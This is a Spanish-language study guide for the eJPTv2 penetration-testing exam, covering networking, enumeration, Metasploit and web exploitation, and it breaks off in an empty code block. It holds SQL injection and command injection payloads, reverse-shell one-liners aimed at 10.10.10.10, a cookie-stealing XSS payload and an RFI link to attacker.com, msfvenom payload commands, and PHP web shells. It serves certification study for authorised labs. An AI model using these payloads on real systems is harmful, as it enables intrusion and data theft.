# Guía de Estudio eJPTv2

## Tabla de Contenidos

- [Introducción](#introducción)
- [Cómo Usar Esta Guía](#cómo-usar-esta-guía)
- [Parte 1: Fundamentos Teóricos](#parte-1-fundamentos-teóricos)
  - [1.1 Fundamentos de Redes](#11-fundamentos-de-redes)
  - [1.2 Sistemas Operativos Esenciales](#12-sistemas-operativos-esenciales)
  - [1.3 Resumen y Recursos](#13-resumen-y-recursos)
- [Parte 2: Reconocimiento y Enumeración](#parte-2-reconocimiento-y-enumeración)
  - [2.1 Reconocimiento Pasivo](#21-reconocimiento-pasivo)
  - [2.2 Reconocimiento Activo](#22-reconocimiento-activo)
  - [2.3 Enumeración de Servicios](#23-enumeración-de-servicios)
  - [2.4 Resumen y Recursos](#24-resumen-y-recursos)
- [Parte 3: Técnicas de Explotación](#parte-3-técnicas-de-explotación)
  - [3.1 Vulnerabilidades Comunes](#31-vulnerabilidades-comunes)
  - [3.2 Frameworks de Explotación](#32-frameworks-de-explotación)
  - [3.3 Shells y Acceso Remoto](#33-shells-y-acceso-remoto)
  - [3.4 Resumen y Recursos](#34-resumen-y-recursos)
- [Parte 4: Post-Explotación y Escalado de Privilegios](#parte-4-post-explotación-y-escalado-de-privilegios)
  - [4.1 Escalado de Privilegios en Linux](#41-escalado-de-privilegios-en-linux)
  - [4.2 Escalado de Privilegios en Windows](#42-escalado-de-privilegios-en-windows)
  - [4.3 Técnicas de Post-Explotación](#43-técnicas-de-post-explotación)
  - [4.4 Buenas Prácticas](#44-buenas-prácticas)
  - [4.5 Resumen y Recursos](#45-resumen-y-recursos)
- [Parte 5: Referencia de Herramientas](#parte-5-referencia-de-herramientas)
  - [5.1 Herramientas de Escaneo](#51-herramientas-de-escaneo)
  - [5.2 Herramientas de Fuerza Bruta](#52-herramientas-de-fuerza-bruta)
  - [5.3 Herramientas de Red](#53-herramientas-de-red)
  - [5.4 Resumen y Recursos](#54-resumen-y-recursos)
- [Parte 6: Ejercicios Prácticos](#parte-6-ejercicios-prácticos)
  - [6.1 Ejercicio 1: Reconocimiento y Enumeración Básica](#61-ejercicio-1-reconocimiento-y-enumeración-básica)
  - [6.2 Ejercicio 2: Explotación de Aplicaciones Web](#62-ejercicio-2-explotación-de-aplicaciones-web)
  - [6.3 Ejercicio 3: Escalado de Privilegios en Linux](#63-ejercicio-3-escalado-de-privilegios-en-linux)
  - [6.4 Ejercicio 4: Escalado de Privilegios en Windows](#64-ejercicio-4-escalado-de-privilegios-en-windows)
  - [6.5 Ejercicio 5: Prueba de Penetración Multi-Etapa](#65-ejercicio-5-prueba-de-penetración-multi-etapa)
  - [6.6 Resumen y Recursos](#66-resumen-y-recursos)
- [Parte 7: Preparación para el Examen](#parte-7-preparación-para-el-examen)
  - [7.1 Consejos y Trucos](#71-consejos-y-trucos)
  - [7.2 Errores Comunes](#72-errores-comunes)
  - [7.3 Plan de Estudio](#73-plan-de-estudio)
  - [7.4 Resumen y Motivación](#74-resumen-y-motivación)
- [Parte 8: Recursos Adicionales](#parte-8-recursos-adicionales)
  - [8.1 Referencias y Recursos](#81-referencias-y-recursos)
  - [8.2 Resumen](#82-resumen)
- [Apéndices](#apéndices)
  - [A. Cheatsheet de Comandos](#a-cheatsheet-de-comandos)
  - [B. Tabla de Referencia de Puertos](#b-tabla-de-referencia-de-puertos)

---

## Introducción

¡Bienvenido a mi Guía de Estudio eJPTv2! 👋

Soy **jotatito05** y estos son los apuntes que he creado durante mi preparación para el examen eLearnSecurity Junior Penetration Tester versión 2 (eJPTv2). He decidido compartirlos **voluntaria y gratuitamente** con la comunidad porque creo firmemente que el conocimiento en ciberseguridad debe ser accesible para todos.

Estos apuntes son el resultado de horas de estudio, práctica y recopilación de información de múltiples fuentes. Los comparto con la esperanza de que te ayuden en tu propio camino hacia la certificación eJPTv2, tal como otros recursos me ayudaron a mí.

### ¿Qué encontrarás en esta guía?

- **Fundamentos teóricos sólidos**: Conceptos de redes, protocolos y sistemas operativos
- **Técnicas prácticas**: Reconocimiento, enumeración, explotación y post-explotación
- **Herramientas esenciales**: Guías detalladas de las herramientas más importantes
- **Ejercicios completos**: Escenarios paso a paso para practicar
- **Consejos para el examen**: Estrategias, trucos y errores comunes a evitar
- **Recursos adicionales**: Enlaces a documentación, plataformas de práctica y comunidades

### ¿Por qué comparto estos apuntes?

Cuando empecé a estudiar para el eJPTv2, encontré mucha información dispersa y a veces confusa. Decidí crear mis propios apuntes organizados y, una vez que vi lo útiles que eran para mí, pensé: "¿Por qué no compartirlos con otros que están en el mismo camino?"

**Mi filosofía**:
- **Accesible**: Lenguaje claro y explicaciones paso a paso (como me hubiera gustado encontrar)
- **Práctico**: Cada concepto viene con ejemplos reales que he probado
- **Honesto**: Estos son mis apuntes personales, con mi estilo y mi forma de entender las cosas
- **Colaborativo**: Si encuentras errores o quieres contribuir, ¡eres bienvenido!

> **📝 Nota personal**: Estos apuntes reflejan mi proceso de aprendizaje. Puede que encuentres formas diferentes de hacer las cosas, y eso está bien. Usa lo que te sirva y adapta el resto a tu estilo.

## Cómo Usar Esta Guía

### Para principiantes

Si eres nuevo en pentesting, te recomendamos seguir la guía en orden:

1. **Comienza con los fundamentos** (Parte 1): Asegúrate de entender bien los conceptos de redes y sistemas operativos
2. **Practica con las herramientas** (Partes 2-3): Familiarízate con las herramientas básicas de reconocimiento y enumeración
3. **Avanza a técnicas más complejas** (Partes 4-5): Escalado de privilegios y post-explotación
4. **Practica con ejercicios** (Parte 6): Aplica todo lo aprendido en escenarios completos
5. **Prepárate para el examen** (Parte 7): Revisa consejos y estrategias específicas

### Para usuarios con experiencia

Si ya tienes conocimientos básicos:

- Usa la **tabla de contenidos** para navegar directamente a los temas que necesitas reforzar
- Enfócate en los **ejercicios prácticos** (Parte 6) para validar tus conocimientos
- Revisa la **referencia de herramientas** (Parte 5) como cheatsheet rápido
- Consulta los **consejos para el examen** (Parte 7) para estrategias específicas del eJPTv2

### Consejos de estudio

- **Practica activamente**: No solo leas, ejecuta los comandos en un entorno de laboratorio
- **Toma notas**: Crea tu propio cheatsheet personalizado
- **Usa plataformas de práctica**: HackTheBox, TryHackMe, VulnHub
- **Únete a comunidades**: Comparte dudas y aprende de otros
- **Sé paciente contigo mismo**: Todos aprendemos a nuestro propio ritmo

### Convenciones de formato

A lo largo de esta guía usaremos:

**Bloques de código** para comandos:
```bash
nmap -sV -sC 192.168.1.1
```

**Bloques de salida** para outputs:
```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.1.1
```

**Tablas** para información estructurada:

| Puerto | Servicio | Descripción |
|--------|----------|-------------|
| 22     | SSH      | Secure Shell |
| 80     | HTTP     | Web Server   |

**Listas** para pasos o conceptos relacionados:
- Primer paso
- Segundo paso
- Tercer paso

> **Nota importante**: Los cuadros como este resaltan información clave

> **⚠️ Advertencia**: Estos cuadros señalan precauciones importantes

> **💡 Consejo**: Estos cuadros ofrecen trucos y mejores prácticas

### Entorno de práctica

Para seguir esta guía necesitarás:

- **Sistema operativo**: Linux (preferiblemente Kali Linux o Parrot OS)
- **Máquinas virtuales**: VirtualBox o VMware para crear laboratorios
- **Plataformas online**: Cuentas en HackTheBox, TryHackMe o similares
- **Herramientas**: La mayoría vienen preinstaladas en Kali Linux

> **💡 Consejo**: Si no puedes instalar Linux, puedes usar Windows con WSL2 (Windows Subsystem for Linux) o una máquina virtual.

### Ética y legalidad

> **⚠️ IMPORTANTE**: Las técnicas descritas en estos apuntes son para fines educativos y deben usarse ÚNICAMENTE en:
> - Tus propios sistemas
> - Entornos de laboratorio controlados
> - Plataformas de práctica autorizadas (HackTheBox, TryHackMe, etc.)
> - Sistemas donde tengas permiso explícito por escrito
>
> El uso no autorizado de estas técnicas es **ilegal** y puede tener consecuencias graves. Comparto este conocimiento con la confianza de que lo usarás de forma ética y responsable.

### Agradecimientos y contribuciones

Estos apuntes son posibles gracias a la comunidad de ciberseguridad que comparte conocimiento libremente. Si encuentras útil este material:

- ⭐ Dale una estrella al repositorio
- 🐛 Reporta errores o sugiere mejoras
- 🤝 Compártelo con otros que estén estudiando
- 💬 Únete a la comunidad y ayuda a otros

**Créditos**: Estos apuntes recopilan información de múltiples fuentes públicas, documentación oficial, y mi experiencia personal. Si reconoces contenido que debería ser acreditado específicamente, por favor házmelo saber.

---

¡Estás listo para comenzar tu viaje hacia la certificación eJPTv2! Recuerda: cada experto fue una vez un principiante. Con dedicación y práctica, tú también puedes lograrlo.

**- jotatito05** 🚀

---

## Parte 1: Fundamentos Teóricos

Antes de lanzarte a hackear sistemas, necesitas entender cómo funcionan las redes y los sistemas operativos. Esta sección te dará las bases sólidas que necesitas para el resto de tu viaje en pentesting.

### 1.1 Fundamentos de Redes

#### Modelo OSI y TCP/IP

**Modelo OSI (Open Systems Interconnection)**

El modelo OSI tiene 7 capas:

| Capa | Nombre | Función | Ejemplos | Relevancia para Pentesting |
|------|--------|---------|----------|---------------------------|
| 7 | Aplicación | Interacción con aplicaciones de usuario | HTTP, FTP, SSH, DNS | Vulnerabilidades de aplicaciones web, ataques a protocolos |
| 6 | Presentación | Formato y cifrado de datos | SSL/TLS, JPEG, ASCII | Ataques de criptografía, manipulación de datos |
| 5 | Sesión | Gestión de sesiones entre aplicaciones | NetBIOS, RPC | Session hijacking, ataques a sesiones |
| 4 | Transporte | Entrega confiable de datos | TCP, UDP | Port scanning, TCP/UDP attacks |
| 3 | Red | Enrutamiento de paquetes | IP, ICMP, ARP | IP spoofing, routing attacks, ARP poisoning |
| 2 | Enlace de Datos | Transmisión de frames en la red local | Ethernet, Wi-Fi, MAC | MAC spoofing, switch attacks |
| 1 | Física | Transmisión de bits por medios físicos | Cables, señales | Ataques físicos, sniffing |

**Modelo TCP/IP (Internet Protocol Suite)**

| Capa TCP/IP | Equivalente OSI | Función | Protocolos Clave |
|-------------|-----------------|---------|------------------|
| Aplicación | Capas 5-7 | Servicios de red para aplicaciones | HTTP, HTTPS, FTP, SSH, DNS, SMTP |
| Transporte | Capa 4 | Comunicación extremo a extremo | TCP, UDP |
| Internet | Capa 3 | Enrutamiento de paquetes | IP, ICMP, ARP |
| Acceso a Red | Capas 1-2 | Acceso al medio físico | Ethernet, Wi-Fi |

**Analogía práctica**: Imagina que envías una carta:
- **Aplicación**: Escribes el mensaje
- **Transporte**: Decides si enviarla certificada (TCP) o normal (UDP)
- **Internet**: La oficina postal determina la ruta
- **Acceso a Red**: El cartero la entrega físicamente

[⬆️ Volver al inicio](#tabla-de-contenidos)

#### Protocolos Esenciales - Tabla de Referencia Rápida

| Protocolo | Puerto | Función | Vulnerabilidades Comunes |
|-----------|--------|---------|-------------------------|
| HTTP | 80 | Transferencia web sin cifrar | SQLi, XSS, CSRF, información expuesta |
| HTTPS | 443 | Transferencia web cifrada | Certificados débiles, versiones SSL/TLS antiguas |
| FTP | 21 | Transferencia de archivos | Anonymous login, credenciales en texto plano |
| SSH | 22 | Acceso remoto seguro | Contraseñas débiles, versiones vulnerables |
| Telnet | 23 | Acceso remoto sin cifrar | Todo en texto plano, sin autenticación |
| SMTP | 25 | Envío de correo | Open relay, user enumeration |
| DNS | 53 | Resolución de nombres | Zone transfer, cache poisoning |
| TFTP | 69 | Transferencia simple de archivos | Sin autenticación |
| POP3 | 110 | Recepción de correo | Credenciales en texto plano |
| NTP | 123 | Sincronización de tiempo | Amplification attacks |
| NetBIOS | 137-139 | Servicios de red Windows | Null sessions, información expuesta |
| IMAP | 143 | Recepción de correo | Credenciales en texto plano |
| SNMP | 161 | Gestión de red | Community strings débiles, información del sistema |
| LDAP | 389 | Directorio de servicios | LDAP injection, información de AD |
| SMB | 445 | Compartición de archivos Windows | EternalBlue, null sessions, shares mal configurados |
| MSSQL | 1433 | Base de datos Microsoft | SQLi, xp_cmdshell, credenciales débiles |
| MySQL | 3306 | Base de datos | SQLi, credenciales débiles, acceso remoto |
| RDP | 3389 | Escritorio remoto Windows | BlueKeep, credenciales débiles |
| PostgreSQL | 5432 | Base de datos | SQLi, credenciales débiles |
| VNC | 5900 | Escritorio remoto | Sin autenticación, contraseñas débiles |

#### Direccionamiento IP y Subnetting - Lo Esencial

**Clases de IP**:
- Clase A: 10.0.0.0/8 (16,777,214 hosts)
- Clase B: 172.16.0.0/12 (1,048,574 hosts)
- Clase C: 192.168.0.0/16 (65,534 hosts)

**Tabla CIDR rápida**:
```
/24 = 255.255.255.0   = 254 hosts
/25 = 255.255.255.128 = 126 hosts
/26 = 255.255.255.192 = 62 hosts
/27 = 255.255.255.224 = 30 hosts
/28 = 255.255.255.240 = 14 hosts
/29 = 255.255.255.248 = 6 hosts
/30 = 255.255.255.252 = 2 hosts
```

**Comandos útiles**:
```bash
# Calcular subred
ipcalc 192.168.1.0/24

# Ver configuración de red
ip addr show
ifconfig

# Ver tabla de enrutamiento
ip route
route -n
```

### 1.2 Sistemas Operativos Esenciales

#### Linux - Lo que DEBES saber

**Permisos de archivos**:
```bash
# Formato: -rwxr-xr-x
# - = tipo (- archivo, d directorio, l link)
# rwx = propietario (read, write, execute)
# r-x = grupo
# r-x = otros

# Cambiar permisos
chmod 755 archivo.sh    # rwxr-xr-x
chmod +x script.sh      # Agregar ejecución
chmod u+s binario       # SUID (ejecuta como propietario)

# Buscar archivos SUID (importante para privesc)
find / -perm -4000 -type f 2>/dev/null
```

**Comandos esenciales**:
```bash
# Navegación
pwd; cd /ruta; ls -la

# Archivos
cat archivo; head -n 10 archivo; tail -f log.txt
grep "texto" archivo; find / -name archivo.txt

# Procesos
ps aux; top; htop
kill PID; killall proceso

# Servicios
systemctl status servicio
systemctl start/stop/restart servicio

# Usuarios
whoami; id; sudo -l
cat /etc/passwd; cat /etc/shadow

# Red
ip addr; ip route; netstat -tulpn; ss -tulpn
```

**Archivos importantes**:
```
/etc/passwd         # Usuarios
/etc/shadow         # Hashes de contraseñas
/etc/sudoers        # Configuración sudo
/etc/crontab        # Tareas programadas
/var/log/           # Logs del sistema
~/.ssh/             # Claves SSH
~/.bash_history     # Historial de comandos
```

#### Windows - Lo que DEBES saber

**Comandos CMD esenciales**:
```cmd
# Sistema
systeminfo
hostname
whoami /all

# Red
ipconfig /all
netstat -ano
route print

# Usuarios y grupos
net user
net localgroup Administrators
net user usuario password /add

# Procesos
tasklist
taskkill /PID 1234

# Servicios
sc query
sc qc servicio
```

**PowerShell esenciales**:
```powershell
# Sistema
Get-ComputerInfo
Get-Process
Get-Service

# Red
Get-NetIPAddress
Get-NetTCPConnection

# Usuarios
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember -Group "Administrators"
```

**Archivos importantes**:
```
C:\Windows\System32\config\SAM     # Hashes de contraseñas
C:\Users\*\NTUSER.DAT              # Registro del usuario
C:\Windows\Panther\Unattend.xml    # Puede contener credenciales
```

### 1.3 Resumen y Recursos

**Puntos clave**:
- Modelo OSI/TCP-IP: Entiende las 7 capas y dónde ocurren los ataques
- Protocolos: HTTP, FTP, SSH, SMB, DNS son los más importantes
- Subnetting: Practica cálculos CIDR
- Linux: Permisos, SUID, comandos básicos
- Windows: CMD, PowerShell, servicios, registro

**Recursos**:
- [Linux Journey](https://linuxjourney.com/)
- [OverTheWire: Bandit](https://overthewire.org/wargames/bandit/)
- [HackTricks](https://book.hacktricks.xyz/)

> **💡 Mi consejo**: No memorices todo, entiende los conceptos. Los comandos los aprenderás con la práctica.

[⬆️ Volver al inicio](#tabla-de-contenidos)

---

## Parte 2: Reconocimiento y Enumeración

### 2.1 Reconocimiento Pasivo

**OSINT - Herramientas clave**:

```bash
# Google Dorks
site:ejemplo.com filetype:pdf
site:ejemplo.com inurl:admin
site:ejemplo.com intitle:"index of"

# WHOIS
whois ejemplo.com

# theHarvester (emails, subdominios)
theHarvester -d ejemplo.com -b google,bing,crtsh

# Subdominios
curl -s "https://crt.sh/?q=%25.ejemplo.com&output=json" | jq -r '.[].name_value' | sort -u

# Shodan (requiere API key)
shodan search hostname:ejemplo.com
```

**Recursos OSINT**:
- [OSINT Framework](https://osintframework.com/)
- [Shodan](https://www.shodan.io/)
- [crt.sh](https://crt.sh/)
- [Wayback Machine](https://web.archive.org/)

### 2.2 Reconocimiento Activo - Nmap Mastery

**Comandos esenciales de Nmap**:

```bash
# Escaneo básico rápido
nmap -T4 -F 192.168.1.100

# Escaneo completo (mi favorito)
sudo nmap -sS -sV -O -T4 -p- 192.168.1.100

# Escaneo agresivo
sudo nmap -A -T4 -p- 192.168.1.100

# Escaneo de vulnerabilidades
nmap --script=vuln -sV 192.168.1.100

# Guardar resultados (SIEMPRE hazlo)
nmap -sS -sV -p- 192.168.1.100 -oA escaneo_completo
```

**Tipos de escaneo**:
```bash
-sS    # SYN scan (stealth, requiere root) - EL MÁS USADO
-sT    # TCP connect (no requiere root)
-sU    # UDP scan (lento pero importante)
-sV    # Detección de versiones
-O     # Detección de OS
-sC    # Scripts por defecto
-A     # Agresivo (OS, versión, scripts, traceroute)
```

**Scripts NSE útiles**:
```bash
# SMB
nmap --script=smb-enum-shares,smb-enum-users -p 445 IP

# HTTP
nmap --script=http-enum -p 80 IP

# FTP
nmap --script=ftp-anon -p 21 IP

# Vulnerabilidades
nmap --script=vuln IP
```

**Timing**:
```bash
-T0  # Paranoid (muy lento, evasión IDS)
-T1  # Sneaky
-T2  # Polite
-T3  # Normal (por defecto)
-T4  # Aggressive (recomendado para labs)
-T5  # Insane (muy rápido)
```

> **💡 Mi metodología**: 
> 1. Quick scan: `nmap -T4 -F IP`
> 2. Full scan: `nmap -sS -sV -p- IP -oA full`
> 3. Scripts específicos según servicios encontrados

### 2.3 Enumeración de Servicios

#### SMB (139/445) - Enumeración

```bash
# enum4linux (mi favorita)
enum4linux -a 192.168.1.100

# smbclient
smbclient -L //192.168.1.100 -N
smbclient //192.168.1.100/share -U usuario

# smbmap
smbmap -H 192.168.1.100
smbmap -H 192.168.1.100 -u usuario -p password

# crackmapexec
crackmapexec smb 192.168.1.100 --shares
crackmapexec smb 192.168.1.100 -u usuario -p password --users

# Nmap
nmap --script=smb-enum-* -p 445 192.168.1.100
```

#### HTTP/HTTPS (80/443) - Enumeración Web

```bash
# Identificar tecnologías
whatweb http://192.168.1.100

# Directory brute force (GOBUSTER - mi favorito)
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# Nikto (ruidoso pero útil)
nikto -h http://192.168.1.100

# ffuf (fuzzing rápido)
ffuf -u http://192.168.1.100/FUZZ -w wordlist.txt -fc 404

# Curl (inspección manual)
curl -I http://192.168.1.100
curl -v http://192.168.1.100

# Nmap scripts
nmap --script=http-enum,http-title,http-headers -p 80 192.168.1.100
```

**Wordlists útiles**:
```bash
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/common.txt
```

#### FTP (21)

```bash
# Nmap
nmap --script=ftp-anon,ftp-syst -p 21 192.168.1.100

# Cliente FTP
ftp 192.168.1.100
# Usuario: anonymous
# Password: (vacío o cualquier cosa)

# Descargar todo
wget -r ftp://anonymous:anonymous@192.168.1.100/
```

#### SSH (22)

```bash
# Banner grabbing
nc 192.168.1.100 22
ssh -v 192.168.1.100

# Nmap
nmap --script=ssh-auth-methods,ssh-hostkey -p 22 192.168.1.100
```

#### MySQL (3306)

```bash
# Nmap
nmap --script=mysql-info,mysql-databases -p 3306 192.168.1.100

# Cliente
mysql -h 192.168.1.100 -u root -p
```

#### DNS (53)

```bash
# Queries básicas
dig ejemplo.com
nslookup ejemplo.com

# Transferencia de zona
dig axfr @ns1.ejemplo.com ejemplo.com

# Enumeración
dnsrecon -d ejemplo.com
dnsenum ejemplo.com
```

#### SNMP (161)

```bash
# snmpwalk
snmpwalk -v 2c -c public 192.168.1.100

# snmp-check
snmp-check 192.168.1.100

# Brute force community strings
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.1.100
```

#### Tabla de Referencia Rápida

| Puerto | Servicio | Herramienta Principal | Comando Rápido |
|--------|----------|----------------------|----------------|
| 21 | FTP | ftp, nmap | `nmap --script=ftp-anon -p 21 IP` |
| 22 | SSH | ssh, hydra | `ssh user@IP` |
| 80/443 | HTTP/S | gobuster, nikto | `gobuster dir -u http://IP -w wordlist.txt` |
| 139/445 | SMB | enum4linux, smbmap | `enum4linux -a IP` |
| 3306 | MySQL | mysql, nmap | `mysql -h IP -u root -p` |
| 3389 | RDP | xfreerdp, hydra | `xfreerdp /v:IP /u:user /p:pass` |

### 2.4 Resumen y Recursos

**Mi checklist de enumeración**:
1. ✅ Nmap full port scan
2. ✅ Identificar servicios y versiones
3. ✅ Enumerar cada servicio encontrado
4. ✅ Buscar vulnerabilidades conocidas
5. ✅ Documentar TODO

**Recursos**:
- [HackTricks](https://book.hacktricks.xyz/) - Técnicas por servicio
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [SecLists](https://github.com/danielmiessler/SecLists) - Wordlists

> **💡 Regla de oro**: La enumeración es el 80% del trabajo. Nunca te apresures aquí.

[⬆️ Volver al inicio](#tabla-de-contenidos)

---

## Parte 3: Técnicas de Explotación

### 3.1 Vulnerabilidades Comunes

#### SQL Injection (SQLi)

**Detección básica**:
```sql
'
' OR 1=1--
' OR '1'='1
admin' OR '1'='1'--
```

**Union-based SQLi**:
```sql
# Encontrar número de columnas
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  # Continúa hasta error

# Union select
' UNION SELECT NULL,NULL,NULL--

# Enumerar bases de datos (MySQL)
' UNION SELECT NULL,schema_name FROM information_schema.schemata--

# Enumerar tablas
' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema='database'--

# Enumerar columnas
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--

# Extraer datos
' UNION SELECT NULL,concat(username,':',password) FROM users--

# Leer archivos
' UNION SELECT NULL,load_file('/etc/passwd')--

# Escribir shell
' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
```

**sqlmap - La herramienta definitiva**:
```bash
# Básico
sqlmap -u "http://ejemplo.com/page.php?id=1"

# POST request
sqlmap -u "http://ejemplo.com/login.php" --data="user=admin&pass=pass"

# Enumerar bases de datos
sqlmap -u "http://ejemplo.com/page.php?id=1" --dbs

# Dump tabla
sqlmap -u "http://ejemplo.com/page.php?id=1" -D database -T users --dump

# OS shell
sqlmap -u "http://ejemplo.com/page.php?id=1" --os-shell

# Desde Burp request
sqlmap -r request.txt --batch
```

#### Command Injection

**Payloads básicos**:
```bash
# Separadores de comandos
; ls
| ls
|| ls
& ls
&& ls
`ls`
$(ls)

# Bypass de filtros
cat /etc/passwd
c''at /etc/passwd
c\at /etc/passwd
cat /e''tc/passwd

# Reverse shell
; bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
; nc -e /bin/bash 10.10.10.10 4444
```

#### File Inclusion (LFI/RFI)

**Local File Inclusion (LFI)**:
```bash
# Básico
http://ejemplo.com/page.php?file=../../../../etc/passwd

# Null byte bypass (PHP < 5.3)
http://ejemplo.com/page.php?file=../../../../etc/passwd%00

# Wrapper PHP
http://ejemplo.com/page.php?file=php://filter/convert.base64-encode/resource=index.php

# Log poisoning
http://ejemplo.com/page.php?file=../../../../var/log/apache2/access.log
# Luego inyecta código PHP en User-Agent
```

**Remote File Inclusion (RFI)**:
```bash
http://ejemplo.com/page.php?file=http://attacker.com/shell.php
```

#### Cross-Site Scripting (XSS)

**Payloads básicos**:
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

**Robar cookies**:
```html
<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>
```

#### File Upload Vulnerabilities

**Bypass de filtros**:
```bash
# Extensiones
shell.php
shell.php.jpg
shell.php%00.jpg
shell.php;.jpg
shell.phtml
shell.php5

# Content-Type
Content-Type: image/jpeg
# Pero el archivo es PHP

# Magic bytes
GIF89a<?php system($_GET['cmd']); ?>
```

### 3.2 Frameworks de Explotación - Metasploit

**Comandos esenciales de Metasploit**:

```bash
# Iniciar
msfconsole

# Buscar exploits
search type:exploit platform:windows smb
search cve:2017 type:exploit

# Usar exploit
use exploit/windows/smb/ms17_010_eternalblue

# Ver opciones
show options
show payloads

# Configurar
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Ejecutar
exploit
run

# Meterpreter básico
sysinfo
getuid
ps
migrate PID
shell
upload archivo.txt
download archivo.txt
hashdump
```

**Exploits comunes para eJPTv2**:
```bash
# EternalBlue (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue

# Tomcat Manager
use exploit/multi/http/tomcat_mgr_upload

# FTP vsftpd backdoor
use exploit/unix/ftp/vsftpd_234_backdoor

# SSH user enumeration
use auxiliary/scanner/ssh/ssh_enumusers

# SMB enumeration
use auxiliary/scanner/smb/smb_enumshares
```

**Generar payloads con msfvenom**:
```bash
# Windows reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe

# Linux reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf

# PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw -o shell.php

# JSP reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw -o shell.jsp

# WAR file (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f war -o shell.war

# Listar formatos
msfvenom --list formats
```

### 3.3 Shells y Acceso Remoto

#### Reverse Shells

**Bash**:
```bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

**Netcat**:
```bash
# Atacante (listener)
nc -lvnp 4444

# Víctima
nc -e /bin/bash 10.10.10.10 4444
nc -e /bin/sh 10.10.10.10 4444

# Sin -e
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f
```

**Python**:
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**PHP**:
```php
php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**PowerShell**:
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### Estabilizar Shells

**Método 1 - Python PTY**:
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

**Método 2 - Script**:
```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
```

**Método 3 - socat**:
```bash
# Atacante
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Víctima
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444
```

#### Web Shells

**PHP simple**:
```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
```

**Uso**:
```
http://ejemplo.com/shell.php?cmd=whoami
http://ejemplo.com/shell.php?cmd=ls -la
```

### 3.4 Resumen y Recursos

**Vulnerabilidades clave para eJPTv2**:
- ✅ SQL Injection (sqlmap)
- ✅ Command Injection
- ✅ File Inclusion (LFI/RFI)
- ✅ File Upload
- ✅ XSS (básico)

**Herramientas esenciales**:
- ✅ Metasploit Framework
- ✅ msfvenom (payloads)
- ✅ sqlmap
- ✅ Netcat
- ✅ Burp Suite

**Recursos**:
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [GTFOBins](https://gtfobins.github.io/)

> **💡 Mi consejo**: Practica shells en labs. Necesitas ser rápido obteniendo y estabilizando shells.

[⬆️ Volver al inicio](#tabla-de-contenidos)

---

## Parte 4: Post-Explotación y Escalado de Privilegios

### 4.1 Escalado de Privilegios en Linux

#### Enumeración Inicial

**Información del sistema**:
```bash
# Sistema operativo y kernel
uname -a
cat /etc/issue
cat /etc/*-release

# Usuario actual
whoami
id
sudo -l

# Usuarios del sistema
cat /etc/passwd
cat /etc/shadow  # Si tienes acceso

# Grupos
cat /etc/group

# Historial de comandos
cat ~/.bash_history
history
```

**Procesos y servicios**:
```bash
ps aux
ps -ef
top

# Servicios corriendo
systemctl list-units --type=service
service --status-all
```

**Red**:
```bash
ifconfig
ip addr
ip route
netstat -tulpn
ss -tulpn
arp -a
```

#### Vectores de Escalado

**1. SUID Binaries** (MUY COMÚN):
```bash
# Buscar binarios SUID
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Buscar binarios SGID
find / -perm -2000 -type f 2>/dev/null

# Buscar archivos escribibles
find / -writable -type f 2>/dev/null
find / -perm -222 -type f 2>/dev/null
```

**Explotar SUID** (consulta [GTFOBins](https://gtfobins.github.io/)):
```bash
